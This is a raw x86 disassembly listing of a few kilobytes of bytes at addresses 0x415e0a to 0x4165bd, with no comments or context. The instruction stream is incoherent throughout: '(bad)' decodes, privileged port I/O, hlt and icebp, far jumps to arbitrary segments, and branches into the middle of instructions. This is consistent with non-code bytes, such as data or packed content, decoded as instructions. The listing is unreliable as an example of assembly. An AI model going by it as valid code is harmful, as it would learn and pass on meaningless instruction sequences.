  415e0a:	push   esi
  415e0b:	cli    
  415e0c:	push   ebx
  415e0d:	aad    0x6c
  415e0f:	pop    eax
  415e10:	push   es
  415e11:	cmp    ebx,ebp
  415e13:	adc    esp,DWORD PTR [eax]
  415e15:	je     0x415e8a
  415e17:	xor    BYTE PTR [ecx+0x56764a1f],cl
  415e1d:	jns    0x415e91
  415e1f:	test   al,0x8d
  415e21:	push   edx
  415e23:	adc    esi,DWORD PTR ds:0x343bdc9f
  415e29:	icebp  
  415e2a:	loopne 0x415e3d
  415e2c:	inc    edx
  415e2d:	jmp    0x415e94
  415e2f:	inc    ebp
  415e30:	xor    DWORD PTR [eax+eax*8+0x67d71507],ecx
  415e37:	sahf   
  415e38:	fldcw  WORD PTR [ebx]
  415e3a:	shl    esp,1
  415e3c:	rcl    esi,0x2
  415e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e40:	arpl   WORD PTR [eax+0x588fd815],dx
  415e46:	push   0x28
  415e48:	fstp   DWORD PTR [esi-0x4be1a659]
  415e4e:	mov    bh,0x24
  415e50:	or     eax,0x47a5e79
  415e55:	or     al,al
  415e57:	cmp    eax,0x57f7b618
  415e5c:	pop    ecx
  415e5d:	pop    edi
  415e5e:	sub    BYTE PTR [esi],bh
  415e60:	mov    ch,ah
  415e62:	and    BYTE PTR [esi+0x4f],ah
  415e65:	test   DWORD PTR [esi],ebx
  415e67:	daa    
  415e68:	fcom   QWORD PTR [ebx+edi*8+0x6c]
  415e6c:	push   eax
  415e6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e6e:	xor    al,0x4e
  415e70:	push   bx
  415e72:	and    BYTE PTR [ebp+0x24b5fb07],bh
  415e78:	inc    ebx
  415e79:	dec    ecx
  415e7a:	ret    
  415e7b:	add    al,0x90
  415e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e7e:	cmp    ecx,0xa94d71f7
  415e84:	push   ebx
  415e85:	pusha  
  415e86:	push   ds
  415e87:	ret    0xadce
  415e8a:	test   BYTE PTR [edx+0x3b],0x85
  415e8e:	sub    DWORD PTR [edi],esp
  415e90:	dec    edi
  415e91:	nop
  415e92:	and    BYTE PTR [edx-0x57],ch
  415e95:	les    ebp,FWORD PTR [ebx]
  415e97:	clc    
  415e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e99:	imul   ebx,DWORD PTR [edi+0x6b],0x27
  415e9d:	mov    esp,0xb7c712c2
  415ea2:	dec    eax
  415ea3:	mov    bl,0x2
  415ea5:	std    
  415ea6:	cmp    edi,DWORD PTR [esi+0x5ab20606]
  415eac:	xchg   esp,eax
  415ead:	sahf   
  415eae:	not    cl
  415eb0:	leave  
  415eb1:	fist   WORD PTR [eax]
  415eb3:	push   0xad7405be
  415eb8:	test   al,0x5c
  415eba:	sbb    al,BYTE PTR [ecx-0x7b]
  415ebd:	cmp    cl,bl
  415ebf:	adc    BYTE PTR [ebx-0x53d2c018],bl
  415ec5:	aaa    
  415ec6:	cmp    DWORD PTR [esp],edx
  415ec9:	cmp    al,0xc2
  415ecb:	xchg   edi,eax
  415ecc:	mov    dl,0x83
  415ece:	sub    eax,0xcf537789
  415ed3:	sub    ch,BYTE PTR [esi]
  415ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed6:	arpl   WORD PTR [ecx+0x50],cx
  415ed9:	je     0x415f2f
  415edb:	ja     0x415e6e
  415edd:	mov    cl,0x4e
  415edf:	loopne 0x415ea4
  415ee1:	leave  
  415ee2:	sub    BYTE PTR ds:0xba6be6d6,dl
  415ee8:	jecxz  0x415ef1
  415eea:	bound  ebp,QWORD PTR ds:0xc8dd7319
  415ef0:	pop    edi
  415ef1:	add    eax,0x9cce27ae
  415ef6:	call   0xa28293b3
  415efb:	cld    
  415efc:	(bad)  
  415efd:	int3   
  415efe:	mov    bl,0xaa
  415f00:	clc    
  415f01:	adc    esp,DWORD PTR [esi]
  415f03:	pop    ebx
  415f04:	clc    
  415f05:	dec    ebx
  415f06:	outs   dx,BYTE PTR ds:[esi]
  415f07:	adc    DWORD PTR [eax],ecx
  415f09:	sbb    BYTE PTR [ecx],ch
  415f0b:	dec    edx
  415f0c:	pop    ebp
  415f0d:	and    bh,al
  415f0f:	pushf  
  415f10:	aad    0x2b
  415f12:	pop    ecx
  415f13:	lock inc esi
  415f15:	mov    esi,0xd5b233fa
  415f1a:	mov    ebp,0x77e1676b
  415f1f:	xor    ch,BYTE PTR [eax-0x54a11155]
  415f25:	cmp    DWORD PTR [esi-0x19],edx
  415f28:	push   es
  415f29:	aaa    
  415f2a:	or     dl,BYTE PTR [edx*1+0x107130]
  415f31:	lds    ebx,FWORD PTR [ebx+0x1e]
  415f34:	push   0x5706d1ad
  415f39:	push   ecx
  415f3a:	and    BYTE PTR [esi+edx*8-0x2c],bh
  415f3e:	ins    BYTE PTR es:[edi],dx
  415f3f:	or     DWORD PTR [esi],ebp
  415f41:	stos   BYTE PTR es:[edi],al
  415f42:	int    0x12
  415f44:	test   eax,0x876e0596
  415f49:	shr    DWORD PTR [edx+0x39cd33a4],1
  415f4f:	lock (bad) 
  415f51:	hlt    
  415f52:	jno    0x415f73
  415f54:	pop    edx
  415f55:	push   ds
  415f56:	gs out 0x86,eax
  415f59:	out    0x9d,al
  415f5b:	add    BYTE PTR [eax+0xf],ah
  415f5e:	pop    esi
  415f5f:	lahf   
  415f60:	mov    WORD PTR [edi],ds
  415f62:	out    0x16,eax
  415f64:	hlt    
  415f65:	out    dx,al
  415f66:	mov    eax,ds:0xd4714e04
  415f6b:	add    al,0xea
  415f6d:	fstp   QWORD PTR [esi+0x4ca80eba]
  415f73:	lea    ebx,[eax]
  415f75:	jg     0x415fa7
  415f77:	bound  ebp,QWORD PTR cs:[edi+0x32]
  415f7b:	add    BYTE PTR [esi-0xa],dl
  415f7e:	fst    DWORD PTR [ecx-0x26]
  415f81:	outs   dx,DWORD PTR ds:[esi]
  415f82:	imul   esi,DWORD PTR [ebx],0xffffffe1
  415f85:	aaa    
  415f86:	push   ds
  415f87:	cdq    
  415f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f89:	stos   DWORD PTR es:[edi],eax
  415f8a:	xchg   BYTE PTR [ecx+eiz*2],dl
  415f8d:	aam    0xc1
  415f8f:	outs   dx,BYTE PTR ds:[esi]
  415f90:	arpl   WORD PTR [eax+0x734e2c9],dx
  415f96:	xor    eax,0x1ea91273
  415f9b:	pop    eax
  415f9c:	and    eax,0x6c7c1bae
  415fa1:	test   edx,eax
  415fa3:	inc    eax
  415fa4:	xchg   esi,eax
  415fa5:	add    ecx,esi
  415fa7:	or     al,0x68
  415fa9:	aas    
  415faa:	pop    esi
  415fab:	push   esp
  415fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fad:	and    ebp,0x258c202e
  415fb3:	pop    esp
  415fb4:	fld    QWORD PTR [ebp-0x4740a95f]
  415fba:	mov    edx,0xb65c7b79
  415fbf:	and    dl,BYTE PTR [eax-0x5b]
  415fc2:	ss int3 
  415fc4:	in     al,0xd3
  415fc6:	retf   
  415fc7:	aas    
  415fc8:	push   esp
  415fc9:	dec    ebx
  415fca:	test   sp,0x9fac
  415fcf:	(bad)  
  415fd0:	(bad)  [edi]
  415fd2:	sub    al,0xbd
  415fd4:	aas    
  415fd5:	cli    
  415fd6:	pop    edx
  415fd7:	(bad)  
  415fd8:	mov    esi,0x3428d36f
  415fdd:	jne    0x415f8b
  415fdf:	push   ecx
  415fe0:	int    0x2a
  415fe2:	rcl    DWORD PTR [ecx-0x1bd1621e],0x50
  415fe9:	sub    al,BYTE PTR [edi+ebp*4+0x34]
  415fed:	or     al,0x4f
  415fef:	loopne 0x41601e
  415ff1:	mov    ch,0x93
  415ff3:	or     BYTE PTR [eax+0x12],0xb8
  415ff7:	pusha  
  415ff8:	jnp    0x416024
  415ffa:	cmp    cl,BYTE PTR [esi-0x4e558107]
  416000:	je     0x416009
  416002:	and    eax,DWORD PTR [esi-0x3549e0c8]
  416008:	sub    eax,0x38492149
  41600d:	dec    edx
  41600e:	jle    0x41604b
  416010:	sbb    BYTE PTR [esp+esi*8-0x7a],bh
  416014:	and    eax,0xf339f9e
  416019:	xchg   ebx,eax
  41601a:	push   edx
  41601b:	jmp    DWORD PTR [eax]
  41601d:	idiv   cl
  41601f:	sbb    esp,eax
  416021:	mov    fs,WORD PTR [ecx+0x4c82bc]
  416027:	mov    al,ds:0x712fca12
  41602c:	dec    esi
  41602d:	(bad)  
  41602e:	sbb    BYTE PTR [edi+edx*1+0x5dafd38c],dh
  416035:	or     al,0x34
  416037:	lahf   
  416038:	(bad)  
  416039:	jp     0x416091
  41603b:	ds pop esi
  41603d:	call   FWORD PTR [ecx+0x627c9a8c]
  416043:	push   ds
  416044:	sti    
  416045:	sbb    dl,bh
  416047:	and    BYTE PTR [edx],al
  416049:	jmp    0x72535dad
  41604e:	jl     0x41603e
  416050:	xor    edx,DWORD PTR [edi]
  416052:	sahf   
  416053:	inc    edi
  416054:	imul   ebp,DWORD PTR [ebx-0x5e6617cb],0x44f9d81f
  41605e:	mov    ch,0xe5
  416060:	inc    esi
  416061:	mov    ebp,0xf8337fb2
  416066:	cwde   
  416067:	fsub   st,st(3)
  416069:	dec    ebx
  41606a:	xchg   esi,eax
  41606b:	sub    eax,0x2fefee00
  416070:	inc    esp
  416071:	stos   BYTE PTR es:[edi],al
  416072:	dec    ebx
  416073:	jge    0x41609d
  416075:	(bad)  
  416076:	fstp   TBYTE PTR [edx-0x15]
  416079:	cdq    
  41607a:	retf   
  41607b:	ret    0x6ca1
  41607e:	adc    ch,ah
  416080:	retf   
  416081:	jle    0x4160dd
  416083:	in     al,dx
  416084:	call   0x3c83cacc
  416089:	jo     0x416079
  41608b:	shr    BYTE PTR [edi],0xa3
  41608e:	adc    ch,BYTE PTR [eax-0x26]
  416091:	cmp    DWORD PTR [esi+0x2fb4214],esi
  416097:	xchg   ecx,eax
  416098:	repz shr ebp,0x7c
  41609c:	outs   dx,DWORD PTR ds:[esi]
  41609d:	fisubr WORD PTR [esi-0x26]
  4160a0:	inc    edx
  4160a1:	dec    esp
  4160a2:	clc    
  4160a3:	jg     0x416070
  4160a5:	les    edx,FWORD PTR [esi-0x4]
  4160a8:	sub    dh,ah
  4160aa:	dec    DWORD PTR ds:0xfcbc18df
  4160b0:	cmp    cl,BYTE PTR ds:0xeaafb7b0
  4160b6:	div    DWORD PTR [ebp+0x502f1188]
  4160bc:	into   
  4160bd:	or     eax,DWORD PTR [ecx+0xa]
  4160c0:	popf   
  4160c1:	mov    BYTE PTR [eax+0x241cf789],ah
  4160c7:	fs ins BYTE PTR es:[edi],dx
  4160c9:	les    ebp,FWORD PTR [edi]
  4160cb:	jl     0x416135
  4160cd:	mov    ds:0xf6e48c,al
  4160d2:	xor    eax,0x510d86d0
  4160d7:	inc    edi
  4160d8:	jns    0x41609f
  4160da:	inc    eax
  4160db:	mov    al,ds:0x3b5b0213
  4160e0:	adc    dh,0xbb
  4160e3:	arpl   si,bx
  4160e5:	jo     0x4160b7
  4160e7:	test   eax,0x91dd13fa
  4160ec:	mov    ebp,0x1b1bad2c
  4160f1:	out    0xc4,eax
  4160f3:	xchg   edx,eax
  4160f4:	ror    DWORD PTR [edx+0x66aff12d],cl
  4160fa:	xchg   ebx,eax
  4160fb:	pop    edx
  4160fc:	inc    eax
  4160fd:	xchg   BYTE PTR [ebp-0x68],dh
  416100:	out    dx,eax
  416101:	fwait
  416102:	lds    edi,FWORD PTR [eax+0x1f]
  416105:	pusha  
  416106:	lea    ebx,[ecx+0x6dfc8805]
  41610c:	ins    DWORD PTR es:[edi],dx
  41610d:	ror    cl,cl
  41610f:	mov    edx,0x31e36ca2
  416114:	cwde   
  416115:	stos   BYTE PTR es:[edi],al
  416116:	in     al,0x74
  416118:	mov    ds:0x9bf3b9c8,al
  41611d:	rcl    BYTE PTR [esi-0x1c],cl
  416120:	jnp    0x41614d
  416122:	mov    gs,WORD PTR [eax]
  416124:	jp     0x416116
  416126:	xchg   BYTE PTR [ebx-0x1571c06d],dh
  41612c:	call   0x9d4f:0x7dc4bfe8
  416133:	cdq    
  416134:	mov    ecx,0xaab8f2a
  416139:	aas    
  41613a:	mov    esp,0xbd199327
  41613f:	jo     0x41616d
  416141:	lahf   
  416142:	stos   BYTE PTR es:[edi],al
  416143:	push   0x2a0b623f
  416148:	fild   WORD PTR [edi]
  41614a:	lock sub ecx,edi
  41614d:	pop    eax
  41614e:	dec    edi
  41614f:	ret    
  416150:	ret    
  416151:	psrlw  mm2,QWORD PTR [ebx+esi*4-0x77]
  416156:	fwait
  416157:	or     BYTE PTR [esi+0x7353ad21],ch
  41615d:	shl    DWORD PTR [edx-0x40],1
  416160:	out    dx,al
  416161:	add    cl,bl
  416163:	aad    0x71
  416165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416166:	ins    BYTE PTR es:[edi],dx
  416167:	cmp    eax,0x5a07843f
  41616c:	jae    0x41616d
  41616e:	jne    0x4161ea
  416170:	fld    QWORD PTR [ebp+0x70575983]
  416176:	int3   
  416177:	mov    dh,0xcc
  416179:	inc    ebp
  41617a:	rcl    ebx,1
  41617c:	shl    ecx,1
  41617e:	xor    BYTE PTR ds:0x57792658,0x0
  416185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416186:	xchg   BYTE PTR [edx-0x3f],cl
  416189:	pop    edi
  41618a:	mov    ds:0x4d213904,al
  41618f:	inc    ebp
  416190:	xor    edx,DWORD PTR [ebx-0x4d723a7]
  416196:	shr    DWORD PTR [edx],0x17
  416199:	in     eax,0x68
  41619b:	stc    
  41619c:	xchg   DWORD PTR ds:0xc37db2ab,esi
  4161a2:	mov    bl,0x10
  4161a4:	ins    BYTE PTR es:[edi],dx
  4161a5:	dec    ecx
  4161a6:	pop    ecx
  4161a7:	mov    eax,0x28985944
  4161ac:	push   DWORD PTR [edx+0x5]
  4161af:	scas   al,BYTE PTR es:[edi]
  4161b0:	jp     0x4161f6
  4161b2:	cli    
  4161b3:	popa   
  4161b4:	in     al,0x6c
  4161b6:	inc    ecx
  4161b7:	pop    esp
  4161b8:	mov    bh,0xc6
  4161ba:	test   DWORD PTR [ebx+0x60478133],esi
  4161c0:	inc    eax
  4161c1:	ins    DWORD PTR es:[edi],dx
  4161c2:	rcr    DWORD PTR [ebp+0x1d4138d2],1
  4161c8:	jb     0x4161f7
  4161ca:	mov    ah,0x75
  4161cc:	mov    edx,0x5162672f
  4161d1:	inc    edx
  4161d2:	scas   al,BYTE PTR es:[edi]
  4161d3:	inc    ebx
  4161d4:	inc    edi
  4161d5:	test   ch,ch
  4161d7:	xor    BYTE PTR [ecx-0x45],0x25
  4161db:	mov    bl,0xd7
  4161dd:	mov    DWORD PTR ds:0x66469d7,ecx
  4161e3:	sub    ch,BYTE PTR [eax+eax*8]
  4161e6:	mov    WORD PTR [esi],ss
  4161e8:	xlat   BYTE PTR ds:[ebx]
  4161e9:	jb     0x4161c2
  4161eb:	out    0x54,eax
  4161ed:	cmp    al,0xd5
  4161ef:	cmc    
  4161f0:	popf   
  4161f1:	aaa    
  4161f2:	addr16 dec ecx
  4161f4:	je     0x4161d3
  4161f6:	popf   
  4161f7:	xchg   ecx,eax
  4161f8:	cmp    eax,0xf325ec37
  4161fd:	and    al,BYTE PTR [ebx+0x33]
  416200:	fidiv  WORD PTR [edi-0x2b]
  416203:	bswap  esp
  416205:	fs leave 
  416207:	mov    ch,0x4d
  416209:	cwde   
  41620a:	dec    ebp
  41620b:	ret    
  41620c:	outs   dx,DWORD PTR ds:[esi]
  41620d:	xchg   ecx,eax
  41620e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41620f:	dec    esi
  416210:	adc    cl,BYTE PTR [ebx]
  416212:	cdq    
  416213:	xchg   ebx,eax
  416214:	cmp    ebp,DWORD PTR [edi]
  416216:	jns    0x41620c
  416218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416219:	retf   
  41621a:	cs into 
  41621c:	mov    ebx,0xab683242
  416221:	xor    esi,DWORD PTR [eax+ebx*2-0x58104fb5]
  416228:	mov    ds:0x83b57aa7,eax
  41622d:	sub    eax,0x4195a8d
  416232:	add    al,0xc2
  416234:	mov    dl,0xbc
  416236:	clc    
  416237:	ret    
  416238:	ins    BYTE PTR es:[edi],dx
  416239:	dec    esp
  41623a:	mov    ebp,0x95c42784
  41623f:	or     ah,al
  416241:	sahf   
  416242:	stc    
  416243:	arpl   WORD PTR [ebp+0x9ba9d37],ax
  416249:	stos   BYTE PTR es:[edi],al
  41624a:	xor    eax,0x6d1ec96f
  41624f:	hlt    
  416250:	inc    edx
  416251:	fwait
  416252:	nop
  416253:	cld    
  416254:	test   DWORD PTR [ecx-0x60f4e249],eax
  41625a:	xlat   BYTE PTR ds:[ebx]
  41625b:	call   0x4eaa:0xa99f7fe5
  416262:	aaa    
  416263:	pop    eax
  416264:	fdivp  st(6),st
  416266:	in     al,dx
  416267:	cdq    
  416268:	cwde   
  416269:	sbb    BYTE PTR [esi],cl
  41626b:	dec    esp
  41626c:	mov    ah,0x54
  41626e:	mov    WORD PTR [ecx*8+0x2692a2dd],fs
  416275:	jle    0x416219
  416277:	repz rol BYTE PTR [ebp+0x1bc21dc9],0x6c
  41627f:	fimul  WORD PTR [ecx+0x46]
  416282:	add    eax,0xac14679c
  416287:	inc    edi
  416288:	push   0x923b094c
  41628d:	dec    edi
  41628e:	shr    esp,1
  416290:	stos   BYTE PTR es:[edi],al
  416291:	fist   DWORD PTR [edx]
  416293:	ret    0xc994
  416296:	xor    BYTE PTR [edi+0x2b9d1262],ch
  41629c:	mov    ch,0x48
  41629e:	adc    esi,edx
  4162a0:	and    DWORD PTR [ecx],eax
  4162a2:	add    eax,0x5294df1b
  4162a7:	lods   eax,DWORD PTR ds:[esi]
  4162a8:	inc    ebp
  4162a9:	out    0x30,al
  4162ab:	and    DWORD PTR [esi+0x3c],ecx
  4162ae:	pop    ebx
  4162af:	fisttp QWORD PTR [ebx]
  4162b1:	dec    ebx
  4162b2:	xchg   DWORD PTR [ebx+0x45],ebx
  4162b5:	xchg   DWORD PTR [eax-0x4c],ecx
  4162b8:	addr16 push ecx
  4162ba:	pop    es
  4162bb:	(bad)  
  4162bc:	idiv   DWORD PTR [ecx]
  4162be:	add    DWORD PTR ds:0xf25ac2f7,esp
  4162c4:	push   ss
  4162c5:	hlt    
  4162c6:	data16 int3 
  4162c8:	shl    DWORD PTR [ebp+0x58],cl
  4162cb:	arpl   WORD PTR ds:0x90107139,dx
  4162d1:	(bad)  
  4162d2:	hlt    
  4162d3:	mov    DWORD PTR [ebp+0x8],ebp
  4162d6:	dec    BYTE PTR [ebp+0x798ec399]
  4162dc:	std    
  4162dd:	xchg   esp,eax
  4162de:	(bad)  
  4162df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162e0:	xor    DWORD PTR [esi-0x4875e7a7],ebp
  4162e6:	in     al,0xfd
  4162e8:	jg     0x4162f0
  4162ea:	jo     0x4162ea
  4162ec:	sbb    cl,ah
  4162ee:	and    BYTE PTR [ebp+eax*8+0x46],ah
  4162f2:	mov    ecx,DWORD PTR [esi]
  4162f4:	or     BYTE PTR fs:[ebx+0x34],bl
  4162f8:	sti    
  4162f9:	inc    esp
  4162fa:	daa    
  4162fb:	mov    dl,0xd5
  4162fd:	xchg   DWORD PTR [esp+esi*8+0x7c49ba59],edi
  416304:	ins    BYTE PTR es:[edi],dx
  416305:	fadd   QWORD PTR [edi+edi*8+0x1]
  416309:	cli    
  41630a:	inc    edi
  41630b:	loop   0x41636e
  41630d:	sahf   
  41630e:	test   al,0x14
  416310:	aad    0x21
  416312:	cmp    al,0x8a
  416314:	mov    bl,0x52
  416316:	ins    DWORD PTR es:[edi],dx
  416317:	inc    esi
  416319:	int    0xd5
  41631b:	cmp    bl,BYTE PTR [ecx]
  41631d:	xchg   ebx,eax
  41631e:	ret    0xec6c
  416321:	inc    esp
  416322:	sub    dh,dh
  416324:	mov    eax,0xf51c08c5
  416329:	not    BYTE PTR [edx+ebp*2-0x749ffb09]
  416330:	dec    ebx
  416331:	pop    ebp
  416332:	test   BYTE PTR [ebx],0x42
  416335:	push   edx
  416336:	sahf   
  416337:	mov    al,ds:0xd839150c
  41633c:	shl    ch,cl
  41633e:	in     al,dx
  41633f:	inc    esi
  416340:	adc    al,al
  416342:	in     eax,dx
  416343:	pushf  
  416344:	push   edi
  416345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416346:	adc    dl,cl
  416348:	and    bl,BYTE PTR [edi-0x5e7abc68]
  41634e:	jge    0x41639b
  416350:	xchg   esi,eax
  416351:	daa    
  416352:	call   0x3fb2:0x3bc497a6
  416359:	mov    al,ds:0x4383a04d
  41635e:	fisttp WORD PTR [edx+0x77c22020]
  416364:	(bad)  
  416366:	adc    BYTE PTR [ebx+0x3c],al
  416369:	pop    ebp
  41636a:	imul   edi,ebx,0x636f9320
  416370:	jbe    0x416367
  416372:	jp     0x4163ba
  416374:	clc    
  416375:	adc    al,0x5c
  416377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416378:	push   ebx
  416379:	pop    eax
  41637a:	daa    
  41637b:	dec    eax
  41637c:	push   ebx
  41637d:	push   esi
  41637e:	rol    DWORD PTR [edx+0x2f115615],0x80
  416385:	pop    es
  416386:	xor    al,0xd5
  416388:	push   esi
  416389:	sub    bh,BYTE PTR ds:[edi]
  41638c:	ret    
  41638d:	jge    0x41637d
  41638f:	les    ebx,FWORD PTR [ebp+0x4d]
  416392:	cmp    ah,BYTE PTR [edi-0x78]
  416395:	jns    0x416379
  416397:	xor    DWORD PTR [ebp-0x2f],ebp
  41639a:	(bad)  
  41639b:	inc    ebx
  41639c:	jae    0x4163c6
  41639e:	icebp  
  41639f:	pop    ebp
  4163a0:	idiv   ch
  4163a2:	out    dx,al
  4163a3:	das    
  4163a4:	loope  0x4163d8
  4163a6:	imul   edx,ecx,0x6c
  4163a9:	xlat   BYTE PTR ds:[ebx]
  4163aa:	scas   al,BYTE PTR es:[edi]
  4163ab:	adc    BYTE PTR [eax+0x69],ch
  4163ae:	icebp  
  4163af:	jmp    0x41638c
  4163b1:	push   edi
  4163b2:	sub    eax,0xd5681fd7
  4163b7:	jmp    0x8173:0x8469f8f5
  4163be:	imul   ebx,ebp,0x45
  4163c1:	or     DWORD PTR [ecx],edi
  4163c3:	add    ebx,DWORD PTR [ebp-0x4f7c0714]
  4163c9:	outs   dx,BYTE PTR ds:[esi]
  4163ca:	xchg   ebx,eax
  4163cb:	cmp    DWORD PTR [edx-0x45b70113],edx
  4163d1:	ins    BYTE PTR es:[edi],dx
  4163d2:	repnz ds loopne 0x416415
  4163d6:	mov    edx,0xd1aec842
  4163db:	stos   BYTE PTR es:[edi],al
  4163dc:	push   es
  4163dd:	je     0x4163f9
  4163df:	popf   
  4163e0:	dec    edx
  4163e1:	mov    ebx,DWORD PTR [edi+0x15a83b4b]
  4163e7:	test   DWORD PTR [edx*4-0x60c5b329],0x63b1461b
  4163f2:	pop    ss
  4163f3:	mov    edx,0xf1358f8f
  4163f8:	int3   
  4163f9:	cmp    dh,BYTE PTR [esi-0x12ede157]
  4163ff:	pop    es
  416400:	sbb    dl,BYTE PTR [ecx]
  416402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416403:	mov    esp,0x775cb9dd
  416408:	adc    ecx,DWORD PTR [edx]
  41640a:	push   edi
  41640b:	fnstsw WORD PTR [edi-0x11]
  41640e:	pop    ss
  41640f:	mov    bh,0x7e
  416411:	aam    0x82
  416413:	sub    ebp,ecx
  416415:	sbb    BYTE PTR [esi-0x76],0xaa
  416419:	jno    0x4163dd
  41641b:	xchg   esi,eax
  41641c:	cmp    ebp,DWORD PTR [esi]
  41641e:	inc    edi
  41641f:	jge    0x41644f
  416421:	(bad)  
  416423:	ja     0x4163c2
  416425:	inc    esp
  416426:	push   ecx
  416427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416428:	push   esi
  416429:	das    
  41642a:	enter  0x718c,0xef
  41642e:	test   al,0xfb
  416430:	leave  
  416431:	adc    DWORD PTR [esi-0x52],edi
  416434:	test   al,0xc5
  416436:	cmp    dh,dh
  416438:	les    ebp,FWORD PTR [edx+0xaa29573]
  41643e:	pop    ebx
  41643f:	in     al,dx
  416440:	cwde   
  416441:	leave  
  416442:	and    dl,ah
  416444:	sub    al,0xf3
  416446:	test   DWORD PTR ds:0xc3cbb808,ebp
  41644c:	sbb    DWORD PTR fs:0xc3cf4bc8,esp
  416453:	xor    DWORD PTR [ecx+0x4e72fcd6],esp
  416459:	cmp    dl,BYTE PTR [bp+di]
  41645c:	hlt    
  41645d:	or     eax,0x4e8876b7
  416462:	fmul   DWORD PTR [esi]
  416464:	lahf   
  416465:	jge    0x416470
  416467:	jno    0x41641b
  416469:	sbb    dh,BYTE PTR [edx+0x36d38882]
  41646f:	enter  0xf096,0x7c
  416473:	jecxz  0x4164d0
  416475:	xor    dh,bl
  416477:	or     al,BYTE PTR gs:[ecx-0x2d5ed21]
  41647e:	inc    eax
  41647f:	out    dx,al
  416480:	jmp    0xa69e:0x32bf9584
  416487:	mov    edx,0x756e00f3
  41648c:	or     al,0xf
  41648e:	xchg   ebp,eax
  41648f:	jnp    0x4164cd
  416491:	jp     0x41644b
  416493:	and    BYTE PTR [edx+edi*8-0x7ae0702c],0xd4
  41649b:	out    dx,eax
  41649c:	(bad)  
  41649d:	daa    
  41649e:	mov    ds:0xa73884f3,al
  4164a3:	popf   
  4164a4:	mov    dh,0x2d
  4164a6:	sbb    ch,BYTE PTR [eax+0xf]
  4164a9:	jbe    0x4164bc
  4164ab:	lods   al,BYTE PTR ds:[esi]
  4164ac:	mov    dh,0x3a
  4164ae:	sub    eax,0xcd251883
  4164b3:	lahf   
  4164b4:	and    BYTE PTR [ebp-0x62],ch
  4164b7:	jno    0x4164ab
  4164b9:	jle    0x416525
  4164bb:	pop    es
  4164bc:	ss mov esi,0xddb8a262
  4164c2:	imul   esi,DWORD PTR [esi-0x1ba2f024],0xf1eaacf
  4164cc:	sbb    cl,bh
  4164ce:	pushf  
  4164cf:	xor    bh,BYTE PTR [edi+0x3aba89de]
  4164d5:	mov    eax,0x63b806ae
  4164da:	or     ch,BYTE PTR [esi+0x6cd35d3]
  4164e0:	push   ecx
  4164e1:	pop    eax
  4164e2:	sub    edi,edx
  4164e4:	sub    ah,BYTE PTR [ebx+ebp*4+0x70905d27]
  4164eb:	push   edx
  4164ec:	cmp    BYTE PTR [ebx],al
  4164ee:	test   BYTE PTR ds:0xe1284812,ch
  4164f4:	and    al,cl
  4164f6:	repnz push es
  4164f8:	pop    esp
  4164f9:	ins    DWORD PTR es:[edi],dx
  4164fa:	ret    0x31c8
  4164fd:	add    dh,BYTE PTR [edx+0x3418718c]
  416503:	cdq    
  416504:	hlt    
  416505:	cmp    eax,0x5341a131
  41650a:	push   edi
  41650b:	test   al,0x78
  41650d:	xchg   BYTE PTR [edi],cl
  41650f:	sbb    bl,al
  416511:	stos   DWORD PTR es:[edi],eax
  416512:	and    ecx,eax
  416514:	and    al,0xf2
  416516:	mov    dl,0xff
  416518:	sar    DWORD PTR [edx+eax*4-0x112fdd1d],1
  41651f:	aam    0x48
  416521:	push   eax
  416522:	js     0x416529
  416524:	aaa    
  416525:	jne    0x4164e9
  416527:	pop    es
  416528:	xchg   DWORD PTR [ebx],esp
  41652a:	add    DWORD PTR [eax+0x289b5265],edi
  416530:	repnz pop ds
  416532:	or     BYTE PTR ss:[edi+0x4de68544],al
  416539:	aam    0x82
  41653b:	(bad)  
  41653c:	push   ebx
  41653d:	mov    eax,0x1020afea
  416542:	mov    BYTE PTR [edi+0x9],bl
  416545:	jmp    FWORD PTR [esi]
  416547:	arpl   WORD PTR [eax-0x76],sp
  41654a:	div    DWORD PTR [esi-0x23fa2d93]
  416550:	pop    ss
  416551:	adc    BYTE PTR [esi+0x44bf76d1],al
  416557:	test   al,0xde
  416559:	mov    ?,WORD PTR [edi-0x10d3260c]
  41655f:	scas   al,BYTE PTR es:[edi]
  416560:	mov    bh,0x6f
  416562:	sub    eax,0x547fadcd
  416567:	pop    esp
  416568:	aam    0xd1
  41656a:	mov    edi,0x501afcae
  41656f:	out    dx,al
  416570:	lahf   
  416571:	mov    dl,0x63
  416573:	sti    
  416574:	je     0x416501
  416576:	mov    ds:0xa480548d,al
  41657b:	add    ebp,DWORD PTR [ebp+0xf]
  41657e:	jmp    0x416508
  416580:	jmp    0x416533
  416582:	repz cmc 
  416584:	cli    
  416585:	cdq    
  416586:	ret    0x6d4d
  416589:	sub    BYTE PTR [eax-0x62361244],ch
  41658f:	mov    edx,0xb345edcc
  416594:	inc    ebx
  416595:	enter  0x6ecb,0xcb
  416599:	iret   
  41659a:	fild   DWORD PTR [edx+0x6a]
  41659d:	out    dx,al
  41659e:	xor    bh,cl
  4165a0:	push   ebp
  4165a1:	test   al,0x27
  4165a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165a4:	cmc    
  4165a5:	popf   
  4165a6:	xchg   esi,eax
  4165a7:	int    0x81
  4165a9:	mov    ebx,0xdad6ae2
  4165ae:	mov    ds:0x66cc4b,eax
  4165b3:	test   BYTE PTR [ecx+0x39],dl
  4165b6:	or     cl,BYTE PTR [edi]
  4165b8:	lds    edx,FWORD PTR [eax+ebx*8]
  4165bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165bc:	scas   eax,DWORD PTR es:[edi]
  4165bd:	sbb    dl,dh
